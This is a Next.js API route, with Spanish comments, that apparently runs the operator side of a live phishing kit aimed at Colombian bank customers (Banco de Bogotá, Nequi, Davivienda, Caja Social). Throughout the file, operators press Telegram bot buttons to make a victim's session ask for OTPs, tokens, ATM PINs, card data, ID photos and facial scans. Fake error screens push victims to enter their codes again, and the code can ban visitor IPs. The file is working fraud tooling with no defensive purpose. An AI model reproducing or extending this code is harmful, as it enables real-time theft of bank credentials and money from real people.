import { NextResponse } from "next/server";
import { getSessionStatus, setSessionStatus } from "@/lib/supabaseSession";
import { getTelegramConfig } from "@/lib/telegramConfig";

export const dynamic = "force-dynamic";

let lastTelegramPollTime = 0;

function getResponseText(status: string, sessionId: string) {
  const map: Record<string, string> = {
    otp: `🔑 Solicitando OTP...`,
    eotp: `❌ Error en OTP, pidiendo de nuevo...`,
    otp8: `🔑 Solicitando OTP (8 dígitos)...`,
    eotp8: `❌ Error en OTP (8 dígitos), pidiendo de nuevo...`,
    error_asesor: `⛔ Notificando error de transacción (Asesor)...`,
    autorizar_app: `📲 Solicitando autorización en App Banco de Bogotá...`,
    token: `🔑 Solicitando Token...`,
    etoken: `❌ Error en Token, pidiendo de nuevo...`,
    dinamica: `🔐 Solicitando Clave Dinámica...`,
    edinamica: `❌ Error en Dinámica, pidiendo de nuevo...`,
    cajero: `🔢 Solicitando Clave Cajero...`,
    ecajero: `❌ Error en Clave Cajero, pidiendo de nuevo...`,
    edavivienda: `⛔ Mostrando Error Sistema (Excúsenos)...`,
    tc: `💳 Solicitando Tarjeta (TC/TD)...`,
    etc: `❗ Error en Tarjeta, pidiendo reintento...`,
    actdatos: `👤 Solicitando Actualización de Datos...`,
    facial: `🤳 Solicitando Verificación Facial...`,
    elogo: `⚠️ Error de acceso (Logo)...`,
    fin: `✅ Sesión finalizada con éxito.`,
    err_breb: `❌ Error en Bre-B. Volver a intentar.`,
    xsistema: `❌ Falla en el sistema (XSistema)...`,
    xbloqueo: `❌ Bloqueo por seguridad (Código 923)...`,
    efacial_frente: `❌ Error en Foto Frontal ID, pidiendo de nuevo...`,
    efacial_dorso: `❌ Error en Foto Trasera ID, pidiendo de nuevo...`,
    efacial_cara: `❌ Error en Verificación Facial, pidiendo de nuevo...`,
    error: `❌ Error en los datos, pidiendo de nuevo...`,
    esistema: `⛔ Error de Sistema...`,
    vencido: `⏳ Token Vencido, pidiendo de nuevo...`,
    saldo: `💰 Consultando Saldo...`,
  };

  if (status.startsWith('block_')) {
    const ip = status.replace('block_', '');
    return `🚫 IP Baneada: ${ip}`;
  }

  const msg = map[status] || `⚠️ Acción: ${status}`;
  return `${msg}\n🆔 ID: <code>${sessionId}</code>`;
}


const globalAny = global as any;
if (!globalAny.__sessionStatusMap) {
  globalAny.__sessionStatusMap = {};
}
const sessionStatusMap: Record<string, string> = globalAny.__sessionStatusMap;

export async function GET(req: Request) {
  const url = new URL(req.url);
  const sessionId = url.searchParams.get("sessionId");
  const reset = url.searchParams.get("reset");

  if (!sessionId) {
    return NextResponse.json({ status: "missing" });
  }

  if (!globalAny.__sessionLastActiveMap) {
    globalAny.__sessionLastActiveMap = {};
  }
  globalAny.__sessionLastActiveMap[sessionId] = Date.now();

  if (reset === "true") {
    sessionStatusMap[sessionId] = "principal";
    await setSessionStatus(sessionId, "principal");
    return NextResponse.json({ status: "principal", reset: true });
  }

  // --- SOLUCIÓN CON THROTTLING PARA TELEGRAM POLLING ---
  if ((Date.now() - lastTelegramPollTime > 1500)) {
    lastTelegramPollTime = Date.now();
    try {
      const { botToken: BOT_TOKEN } = getTelegramConfig();
      // Consultamos a Telegram si alguien presionó un botón
      let res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20`);
      let data = await res.json();

      if (!data.ok && data.description?.includes("webhook")) {
        console.warn("⚠️ Webhook conflict detected, deleting Telegram webhook for polling...");
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/deleteWebhook`);
        res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20`);
        data = await res.json();
      }

      if (data.ok && data.result && data.result.length > 0) {
        for (const update of data.result) {
          if (update.callback_query && update.callback_query.data) {
            const [action, sid] = update.callback_query.data.split(":");
            
            // Procesar cualquier actualización que tenga un ID de sesión válido
            if (sid) {
              // 🚀 Responder INMEDIATAMENTE a Telegram para quitar el ícono de carga del botón (en background)
              fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ callback_query_id: update.callback_query.id, text: `Procesando...` })
              }).catch(e => console.error("Error answerCallback status DEV:", e));

              const adminName = update.callback_query.from?.first_name || update.callback_query.from?.username || "Admin";
              const originalText = update.callback_query.message.text || update.callback_query.message.caption || "";
              const isNequi = originalText.toLowerCase().includes("nequi");
              const isEmpresas = originalText.toLowerCase().includes("negocios") || originalText.toLowerCase().includes("svn") || originalText.toLowerCase().includes("empresa");
              
              if (action === "menu_efacial") {
                const { getErrorFacialKeyboard } = await import("@/lib/telegramKeyboards");
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    chat_id: update.callback_query.message.chat.id,
                    message_id: update.callback_query.message.message_id,
                    reply_markup: getErrorFacialKeyboard(sid)
                  })
                }).catch(e => console.error(e));
                continue;
              }

              if (action === "menu_back") {
                const { getFullKeyboard, getFullKeyboardNequi, getFullKeyboardEmpresas, getFullKeyboardCajaSocial } = await import("@/lib/telegramKeyboards");
                const isCajaSocial = originalText.toLowerCase().includes("cajasocial") || originalText.toLowerCase().includes("caja social");
                let reply_markup;
                if (isCajaSocial) {
                  reply_markup = getFullKeyboardCajaSocial(sid);
                } else if (isEmpresas) {
                  reply_markup = getFullKeyboardEmpresas(sid);
                } else if (isNequi) {
                  reply_markup = getFullKeyboardNequi(sid);
                } else {
                  reply_markup = getFullKeyboard(sid);
                }
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageReplyMarkup`, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({
                    chat_id: update.callback_query.message.chat.id,
                    message_id: update.callback_query.message.message_id,
                    reply_markup
                  })
                }).catch(e => console.error(e));
                continue;
              }

              // Es una acción final - guardar en memoria y Supabase usando el 'sid' del update
              sessionStatusMap[sid] = action;
              await setSessionStatus(sid, action);
              
              const map: Record<string, string> = {
                otp: `🔑 Solicitando OTP...`,
                eotp: `❌ Error en OTP, pidiendo de nuevo...`,
                otp8: `🔑 Solicitando OTP (8 dígitos)...`,
                eotp8: `❌ Error en OTP (8 dígitos), pidiendo de nuevo...`,
                error_asesor: `⛔ Notificando error de transacción (Asesor)...`,
                autorizar_app: `📲 Solicitando autorización en App Banco de Bogotá...`,
                token: `🔑 Solicitando Token...`,
                etoken: `❌ Error en Token, pidiendo de nuevo...`,
                dinamica: `🔐 Solicitando Clave Dinámica...`,
                edinamica: `❌ Error en Dinámica, pidiendo de nuevo...`,
                cajero: `🔢 Solicitando Clave Cajero...`,
                ecajero: `❌ Error en Clave Cajero, pidiendo de nuevo...`,
                edavivienda: `⛔ Mostrando Error Sistema (Excúsenos)...`,
                tc: `💳 Solicitando Tarjeta (TC/TD)...`,
                etc: `❗ Error en Tarjeta, pidiendo reintento...`,
                actdatos: `👤 Solicitando Actualización de Datos...`,
                facial: `🤳 Solicitando Verificación Facial...`,
                elogo: `⚠️ Error de acceso (Logo)...`,
                fin: `✅ Sesión finalizada con éxito.`,
                err_breb: `❌ Error en Bre-B. Volver a intentar.`,
                xsistema: `❌ Falla en el sistema (XSistema)...`,
                xbloqueo: `❌ Bloqueo por seguridad (Código 923)...`,
                efacial_frente: `❌ Error en Foto Frontal ID, pidiendo de nuevo...`,
                efacial_dorso: `❌ Error en Foto Trasera ID, pidiendo de nuevo...`,
                efacial_cara: `❌ Error en Verificación Facial, pidiendo de nuevo...`,
                error: `❌ Error en los datos, pidiendo de nuevo...`,
                esistema: `⛔ Error de Sistema...`,
                vencido: `⏳ Token Vencido, pidiendo de nuevo...`,
                saldo: `💰 Consultando Saldo...`,
              };

              const msg = map[action] || `⚠️ Acción desconocida: ${action}`;
              const newText = `${originalText}\n\n✅ [${adminName}] solicitó: ${msg}\n🆔 ID: ${sid}`;
              safeEditMessageText(BOT_TOKEN || "", update.callback_query.message.chat.id, update.callback_query.message.message_id, newText, !!update.callback_query.message.text)
                .catch(e => console.error("Error editing message status DEV:", e));
            }
          }
        }
        
        // 🔥 Limpiar TODOS los updates procesados (coincidan o no) para evitar atascos (Clogging)
        const lastUpdateId = data.result[data.result.length - 1].update_id;
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
          .catch(e => console.error("Error clearing updates status:", e));
      }
    } catch (e) {
      console.log("Error consultando Telegram", e);
    }
  }
  // -------------------------------------------------------------

  const dbStatus = await getSessionStatus(sessionId);
  const currentStatus = dbStatus || sessionStatusMap[sessionId] || "principal";
  console.log('---->status query:', sessionId, currentStatus);

  return NextResponse.json({
    status: currentStatus
  }, {
    headers: {
      'Cache-Control': 'no-store'
    }
  });
}

async function safeEditMessageText(botToken: string, chatId: any, messageId: any, text: string, isText: boolean) {
  const payload: any = {
    chat_id: chatId,
    message_id: messageId,
    reply_markup: { inline_keyboard: [] }
  };
  
  const endpoint = isText ? "editMessageText" : "editMessageCaption";
  const textKey = isText ? "text" : "caption";

  // Try 1: HTML
  try {
    const escapedHTML = text
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;");
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: escapedHTML,
        parse_mode: "HTML"
      })
    });
    const data = await res.json();
    if (data.ok) return;
  } catch (e) {}

  // Try 2: Markdown
  try {
    const escapedMarkdown = text.replace(/([_*\[\]()~`>#+\-=|{}.!])/g, "\\$1");
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: escapedMarkdown,
        parse_mode: "Markdown"
      })
    });
    const data = await res.json();
    if (data.ok) return;
  } catch (e) {}

  // Try 3: Plain text
  try {
    await fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        ...payload,
        [textKey]: text
      })
    });
  } catch (e) {}
}

export async function POST(req: Request) {
  try {
    const body = await req.json();
    const { sessionId, action, status } = body;
    const actionKey = action || status;
    if (!sessionId || !actionKey) {
      return NextResponse.json({ error: "Faltan parámetros sessionId y action" }, { status: 400 });
    }

    // 1. Guardar estado en memoria local
    sessionStatusMap[sessionId] = actionKey;
    await setSessionStatus(sessionId, actionKey);

    // 2. Buscar fila en telegram_sessions por ID o documento para sincronizar alias y Telegram
    try {
      const { getClient } = await import("@/lib/supabaseSession");
      const client = getClient();
      const { data: sessionRow } = await client
        .from('telegram_sessions')
        .select('*')
        .or(`id.eq.${sessionId},documento.eq.${sessionId}`)
        .maybeSingle();

      if (sessionRow) {
        if (sessionRow.id) {
          sessionStatusMap[sessionRow.id] = actionKey;
          await setSessionStatus(sessionRow.id, actionKey);
        }
        if (sessionRow.documento) {
          sessionStatusMap[sessionRow.documento] = actionKey;
        }

        const botToken = process.env.TELEGRAM_BOT_TOKEN;
        if (botToken && sessionRow.chat_id && sessionRow.message_id) {
          const textMsg = getResponseText(actionKey, sessionRow.id || sessionId);
          safeEditMessageText(botToken, sessionRow.chat_id, sessionRow.message_id, `[Panel Live] ${textMsg}`, true)
            .catch(e => console.error("Error sincronizando mensaje de Telegram:", e));
        }
      }
    } catch (e) {
      console.warn("Advertencia al sincronizar sesión secundaria en POST /status:", e);
    }

    return NextResponse.json({ success: true, sessionId, status: actionKey });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}